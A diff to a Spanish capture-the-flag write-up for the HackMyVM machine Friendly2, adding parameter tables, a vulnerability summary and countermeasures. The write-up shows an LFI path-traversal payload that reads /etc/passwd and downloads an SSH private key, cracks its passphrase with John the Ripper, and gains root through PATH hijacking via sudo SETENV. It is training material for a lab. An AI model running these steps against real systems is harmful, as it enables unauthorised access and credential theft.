@@ -1,18 +1,26 @@
 # Máquina Friendly2 - HackMyVM
 
 **Plataforma:** [Máquina Friendly2](https://hackmyvm.eu/machines/machine.php?vm=Friendly2)  
-**Dificultad:** Facil  
+**Dificultad:** Fácil  
 **SO:** Linux (Debian)  
-**Técnicas:** Local File Inclusion (LFI), Path Traversal, SSH Cracking (John the Ripper), Path Hijacking.
+**Autor del reto:** —  
+**Técnicas:** Local File Inclusion (LFI), Path Traversal, SSH Cracking (John the Ripper), Path Hijacking
+
+---
 
 ## Índice
 
-1.  [Reconocimiento y Escaneo](https://www.google.com/search?q=%231-reconocimiento-y-escaneo)
-2.  [Enumeración Web y Fuzzing](https://www.google.com/search?q=%232-enumeraci%C3%B3n-web-y-fuzzing)
-3.  [Explotación: Local File Inclusion (LFI)](https://www.google.com/search?q=%233-explotaci%C3%B3n-local-file-inclusion-lfi)
-4.  [Cracking de Clave SSH](https://www.google.com/search?q=%234-cracking-de-clave-ssh)
-5.  [Escalada de Privilegios: Path Hijacking](https://www.google.com/search?q=%235-escalada-de-privilegios-path-hijacking)
-6.  [Flag de Root y Post-Explotación](https://www.google.com/search?q=%236-flag-de-root-y-post-explotaci%C3%B3n)
+1. [Reconocimiento y Escaneo](#1-reconocimiento-y-escaneo)
+2. [Enumeración Web y Fuzzing](#2-enumeración-web-y-fuzzing)
+3. [Explotación: Local File Inclusion (LFI)](#3-explotación-local-file-inclusion-lfi)
+4. [Cracking de Clave SSH](#4-cracking-de-clave-ssh)
+5. [Escalada de Privilegios: Path Hijacking](#5-escalada-de-privilegios-path-hijacking)
+6. [Flag de Root y Post-Explotación](#6-flag-de-root-y-post-explotación)
+7. [Resumen de vulnerabilidades](#7-resumen-de-vulnerabilidades)
+8. [Contramedidas recomendadas](#8-contramedidas-recomendadas)
+9. [Herramientas utilizadas](#9-herramientas-utilizadas)
+
+---
 
 ## 1. Reconocimiento y Escaneo
 
@@ -34,9 +42,17 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 3.372 seconds (75.92 hosts/sec). 4 responded
 ```
 
+| Parámetro | Descripción |
+|-----------|-------------|
+| `-I eth0` | Interfaz de red a utilizar para el escaneo |
+
 | IP | MAC Address | Fabricante |
 | :--- | :--- | :--- |
 | **192.168.100.9** | 08:00:27:0c:8f:a4 | Oracle VirtualBox |
+
+> La IP **192.168.100.9** corresponde a la máquina objetivo Friendly2.
+
+---
 
 ### Escaneo de Puertos y Servicios
 
@@ -65,10 +81,20 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ...
 ```
 
-**Resultados destacados:**
+| Parámetro | Descripción |
+|-----------|-------------|
+| `-p-` | Escanea todos los puertos del 1 al 65535 |
+| `-sS` | TCP SYN scan (stealth): no completa el handshake |
+| `-sC` | Ejecuta scripts NSE por defecto |
+| `-sV` | Detección de versión del servicio |
+| `--min-rate 5000` | Mínimo de paquetes por segundo |
+| `-vvv` | Verbosidad máxima |
+| `-n` | No resuelve nombres DNS |
+| `-Pn` | Omite el ping previo (asume host activo) |
 
-  * **Puerto 22/tcp:** OpenSSH 8.4p1 Debian.
-  * **Puerto 80/tcp:** Apache httpd 2.4.56. Título: *Servicio de Mantenimiento de Ordenadores*.
+> El servidor ejecuta **OpenSSH 8.4p1** en el puerto 22 y **Apache 2.4.56** en el puerto 80 (Servicio de Mantenimiento de Ordenadores).
+
+---
 
 ## 2. Enumeración Web y Fuzzing
 
@@ -102,13 +128,21 @@ Finished
 ===============================================================
 ```
 
+| Parámetro | Descripción |
+|-----------|-------------|
+| `dir` | Modo enumeración de directorios |
+| `-u` | URL objetivo |
+| `-w` | Wordlist a utilizar |
+| `-x html,php` | Extensiones a probar |
+| `-t 200` | Número de hilos concurrentes |
+
 | Directorio | Estado | Descripción |
 | :--- | :--- | :--- |
 | `/tools/` | 301 | Directorio de herramientas internas |
 | `/assets/` | 301 | Recursos estáticos (imágenes, etc.) |
 | `index.html`| 200 | Página principal |
 
-Gracias al fuzzing podemos ver que existen dos directorios de interés para nosotros si vemos el código de _*http://192.168.100.9/toosl/*_ vemos la siguiente información. Podemos ver un comentario que será la clave de la explotación.
+Gracias al fuzzing podemos ver que existen dos directorios de interés para nosotros. Si vemos el código de `http://192.168.100.9/tools/` vemos la siguiente información. Podemos ver un comentario que será la clave de la explotación.
 
 ```html
 <!DOCTYPE html>
@@ -142,13 +176,17 @@ Gracias al fuzzing podemos ver que existen dos directorios de interés para noso
 </html>
 ```
 
+---
+
 ## 3. Explotación: Local File Inclusion (LFI)
 
-Si accedemos a _*http://192.168.100.9/toosl/check_if_exist.php?doc=keyboard*_ podemos en lugar de escribir _*keyboard*_ después del igual escribir otras rutas del sistema lo que nos permitirá aceder a _*/etc/passwd*_ y ver a los usuarios del sistema, de este modo localizamos al usuarios _*gh0st*_. Escribimos en el navegador _*http://192.168.100.9/tools/check_if_exist.php?doc=../../../../../etc/passwd*_ para ver la información de los usuarios. Este tipo de vulnerabilidades se conocen como **LFI** o **Local File Inclusion** ya que podemos acceder a ficheros de la máquina victima a los que no deberíamos tener acceso a través de la URL gracias a un parámetro vulnerable. El método empleado para acceder al fichero _*/etc/passwd*_ se conoce en Hacking Web como **Path Traversal**.
+Si accedemos a `http://192.168.100.9/tools/check_if_exist.php?doc=keyboard` podemos, en lugar de escribir `keyboard` después del igual, escribir otras rutas del sistema lo que nos permitirá acceder a `/etc/passwd` y ver a los usuarios del sistema. De este modo localizamos al usuario `gh0st`. Escribimos en el navegador `http://192.168.100.9/tools/check_if_exist.php?doc=../../../../../etc/passwd` para ver la información de los usuarios. Este tipo de vulnerabilidades se conocen como **LFI** o **Local File Inclusion** ya que podemos acceder a ficheros de la máquina victima a los que no deberíamos tener acceso a través de la URL gracias a un parámetro vulnerable. El método empleado para acceder al fichero `/etc/passwd` se conoce en Hacking Web como **Path Traversal**.
 
-Una vez realizado esto podemos buscar en el directorio _*/home/gh0st/.ssh*_ el id_rsa para poder conectarnos por ssh ya que el servicio está corriendo en el puerto 22.
+> **CVE/Vulnerabilidad**: Se ha identificado una vulnerabilidad crítica de lectura arbitraria en el componente web debido a LFI en el parámetro `doc` del archivo `check_if_exist.php`.
 
-Usamos wget para almacenar el id_rsa en la máquina atacante.
+Una vez realizado esto podemos buscar en el directorio `/home/gh0st/.ssh` el fichero `id_rsa` para poder conectarnos por SSH ya que el servicio está corriendo en el puerto 22.
+
+Usamos `wget` para almacenar el `id_rsa` en la máquina atacante.
 
 ```bash
 ┌──(root㉿kali)-[/tmp]
@@ -179,7 +217,7 @@ check_if_exist.php?do 100%[=======================>]   2,59K  --.-KB/s    en 0s
 └─# mv check_if_exist.php\?doc=..%2F..%2F..%2F..%2F..%2Fhome%2Fgh0st%2F.ssh%2Fid_rsa gh0st_id_rsa
 ```
 
-En este momento intentamos conectarnos por ssh del siguiente modo pero vemos que se nos pide el passphrase de la clave privada. Por lo que usamos hashcat para intentar obtener la clave.
+En este momento intentamos conectarnos por SSH pero vemos que se nos pide la *passphrase* de la clave privada. 
 
 ```bash
 ┌──(root㉿kali)-[/tmp]
@@ -194,16 +232,15 @@ Enter passphrase for key 'gh0st_id_rsa':
 (gh0st@192.168.100.9) Password:
 ```
 
+---
+
 ## 4. Cracking de Clave SSH
 
-Para resolver este problema vamos hacer uso de una de las herramientas de la suite de **John de Ripper** (JRT), muy empleadas en el crackeo de contraseñas, en concreto nos camos a centrar en la herramienta _*ssh2john*_ para obtener el passphrase. Por otra parte, vamos a hacer uso del diccionario _*rockyou.txt*_ muy empleado en ciberseguridad.
-
-La herramienta _*ssh2john*_ onbtiene el hash identificativo de la clave privada, posteriormente a través de fuerza bruta se consigue el passphrase. 
+Para resolver este problema vamos a hacer uso de la suite de **John the Ripper** (JTR), centrandonos en el script `ssh2john` para obtener el *passphrase*. Asimismo, emplearemos el diccionario `rockyou.txt`.
 
 El proceso consiste en una traducción y extracción de metadatos criptográficos: 
-1. Se decodifica el bloque Base64 de la clave privada (id_rsa) a su estado binario original para que su estructura sea legible.
-2. El script ssh2john actúa como un parser que localiza y extrae exclusivamente los parámetros del "candado" (el algoritmo, la sal y las iteraciones), generando un hash estandarizado. 
-3. John the Ripper utiliza ese hash como punto de comparación: toma cada palabra del diccionario rockyou.txt, le aplica la misma fórmula matemática y, si el resultado coincide con el hash extraído, significa que ha encontrado la passphrase correcta.
+1. `ssh2john` decodifica la clave y localiza los parámetros del "candado", extrayendo un hash estandarizado. 
+2. John the Ripper aplica fuerza bruta sobre ese hash contra el diccionario, hasta que el resultado coincida indicando la *passphrase* correcta.
 
 ```bash
 ┌──(root㉿kali)-[/tmp]
@@ -230,7 +267,11 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-_*Nota*_: Si ya hicimos anteriormente este proceso puede ocurrir que ya haya una ocurrencia de la búsqueda y nos salga el siguiente mensaje por lo que podemos ver la información almacenada igualmente del siguiente modo.
+| Parámetro | Descripción |
+|-----------|-------------|
+| `--wordlist` | Define el archivo de diccionario con las contraseñas para hacer la comprobación de fuerza bruta |
+
+> **Nota:** Si ya hicimos anteriormente este proceso puede ocurrir que ya haya una ocurrencia de la búsqueda y nos salga que no hay hashes, pudiendo consultar entonces el resultado con la opción `--show`.
 
 ```bash
 ┌──(root㉿kali)-[/tmp]
@@ -249,7 +290,9 @@ gh0st_id_rsa:celtic
 1 password hash cracked, 0 left
 ```
 
-En este momento podemos acceder por SSH con el usuario _*gh0st*_.
+> **¡Contraseña de clave privada obtenida!** La *passphrase* de la clave SSH del usuario gh0st es `celtic`.
+
+En este momento podemos acceder por SSH con el usuario `gh0st`.
 
 ```bash
 ┌──(root㉿kali)-[/tmp]
@@ -257,17 +300,19 @@ En este momento podemos acceder por SSH con el usuario _*gh0st*_.
 ...
 ```
 
-Llegados a este punto vamos a realizar la escalada de privilegios a root mediante una técnica conocida como **Path Hijacking**.
+> **¡Máquina comprometida!** Tenemos acceso inicial como el usuario `gh0st`.
+
+---
 
 ## 5. Escalada de Privilegios: Path Hijacking
 
-Primero de todo vemos si existe algún fichero con permisos SETUID extraño.
+Primero vemos si existe algún fichero con permisos SUID extraño.
 
 ```bash
 gh0st@friendly2:~$ find / -perm 4000 2>/dev/null
 ```
 
-Analizamos los privilegios de sudo del usuario `gh0st`:
+Analizamos los privilegios de `sudo` del usuario `gh0st`:
 
 ```bash
 gh0st@friendly2:~$ sudo -l
@@ -312,17 +357,15 @@ echo "Original string: $string"
 echo "Encoded string: $encoded_string"
 ```
 
-El script `/opt/security.sh` utiliza comandos como `grep` y `tr` sin rutas absolutas. Además, tenemos el permiso **SETENV**, lo que permite manipular la variable `$PATH`.
+El script `/opt/security.sh` utiliza comandos como `grep` y `tr` sin rutas absolutas. Además, tenemos el permiso **SETENV**, lo que permite manipular las variables de entorno alterando la variable `$PATH`.
 
 ### Explotación del Path
 
-Como el script llama a los binarios _*grep*_ y _*tr*_ de forma relativa podremos usar **Path Hijacking** o secuestro de rutas como técnica de escalada de privilegios que aprovecha una configuración insegura en la variable de entorno $PATH. Ocurre cuando un sistema o programa intenta ejecutar un binario utilizando una ruta relativa y el atacante tiene permisos de escritura en uno de los directorios que aparecen primero en el $PATH.
+Como el script llama a los binarios `grep` y `tr` de forma relativa podremos usar **Path Hijacking** (secuestro de rutas). Esta técnica aprovecha una configuración insegura de la variable `$PATH` cuando se intenta ejecutar un binario de forma relativa y el atacante tiene permisos de escritura en un directorio que se cruza primero.
 
-El atacante coloca un archivo malicioso con el mismo nombre que el comando legítimo en su directorio controlado. Al ejecutar el programa, el sistema recorre el $PATH, encuentra primero el binario falso y lo ejecuta con los privilegios del proceso original, permitiendo al atacante tomar el control.
+Colocando un archivo malicioso llamado `grep` en nuestro directorio y añadiendo dicho directorio al inicio del `$PATH` (gracias a `SETENV`), logramos que el script de root ejecute nuestro archivo creyendo que es el filtro de texto legítimo.
 
-Por otra parte, la variable _*SETENV*_ concede al usuario la capacidad de dictar el entorno de ejecución del comando privilegiado. En un escenario de escalada de privilegios, esto permite inyectar variables maliciosas que alteren el flujo de ejecución del script (como la ruta de librerías o ejecutables), permitiendo ejecutar código arbitrario como root.
-
-Procedemos a la explotación de la vulnerabilidad.
+Procedemos a la explotación para darnos el bit SUID al bash principal.
 
 ```bash
 gh0st@friendly2:~$ ls
@@ -365,6 +408,14 @@ Not yet! Try to find root.txt.
 Hint: ...
 ```
 
+> **¡Escalada completada!** Somos `root`.
+
+---
+
+## 6. Flag de Root y Post-Explotación
+
+En el directorio `/root` encontramos una pista que nos redirige a un directorio oculto: `/.../`.
+
 ```bash
 bash-5.1# find / -name "..." 2>/dev/null
 /...
@@ -379,18 +430,46 @@ CODIGO
 Hint: numbers are not codified
 ```
 
-## 6. Flag de Root y Post-Explotación
-
-En el directorio `/root` encontramos una pista que nos redirige a un directorio oculto: `/.../`.
-
-```bash
-cd /...
-cat ebbg.txt
-```
-
 El contenido está cifrado. El nombre del archivo (`ebbg`) es el resultado de aplicar **ROT13** a la palabra `root`. Aplicamos el mismo cifrado al contenido para obtener la flag final:
 
 ```bash
 bash-5.1# echo "CODIGO" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 CODIGO
 ```
+
+> **¡Flag de root obtenida!**
+
+---
+
+## 7. Resumen de vulnerabilidades
+
+| # | Vulnerabilidad | CVE | Criticidad | Impacto |
+|---|---------------|-----|------------|---------|
+| 1 | Local File Inclusion (LFI) & Path Traversal | — | Alta | Permite lectura de archivos locales privados y confidenciales (p.ej., `/etc/passwd` y `.ssh/id_rsa`). |
+| 2 | Clave SSH con Passphrase débil | — | Media | La clave privada estaba encriptada con una contraseña fácilmente adivinable, logrando el acceso total a la cuenta de usuario en SSH. |
+| 3 | Escalada por Path Hijacking con SETENV en Sudo | — | Crítica | Permite abusar de comandos ejecutados dentro de scripts que no usan rutas absolutas, inyectando flujos que ceden control como usuario escalado (root). |
+
+---
+
+## 8. Contramedidas recomendadas
+
+1. **Local File Inclusion**: Sanitizar los parámetros introductorios de la aplicación web. Nunca inyectar variables recibidas (como `doc=...`) directamente en bloques de lectura. Utilizar comprobaciones previas, listas blandas (whitelists), o procesar las variables con funciones como `basename()` impidiendo saltos de directorio.
+2. **Claves SSH Inseguras**: Usar *passphrases* fuertes y complejas. Aislar la carpeta `/home` garantizando que no pueda ser transversalizable a través del LFI de ningún proceso de negocio web.
+3. **Mala configuración de sudo y scripts**: Utilizar explícitamente rutas absolutas para invocar procesos dentro de cualquier script de bash sujeto a ejecución elevada (ej. `/bin/grep` en vez de `grep`). Adicionalmente, remover el atributo `SETENV` del fichero `/etc/sudoers` para un comando, con el fin de evitar que el `$PATH` local se propague e influya en los flujos del sistema escalado.
+
+---
+
+## 9. Herramientas utilizadas
+
+| Herramienta | Uso |
+|-------------|-----|
+| `arp-scan` | Descubrimiento de hosts y dispositivos en la red local |
+| `nmap` | Escaneo y enumeración completa de puertos |
+| `gobuster` | Fuzzing y enumeración de directorios de servidor web |
+| `wget` | Descarga de ficheros remotos durante la extracción por LFI |
+| `ssh` | Establecimiento de conexión |
+| `ssh2john` | Extracción de huella (metadata condicional) para *passphrase* de id_rsa |
+| `john` / `John the Ripper` | Interacción de fuerza bruta para desvelar contraseña local |
+| `sudo` | Obtención de permisos privilegiados e investigación de roles |
+| `find` | Inspección de variables del sistema en búsqueda de dependencias o ficheros camuflados |
+| `bash -p` | Evitar la pérdida de los privilegios SUID en el salto a root |
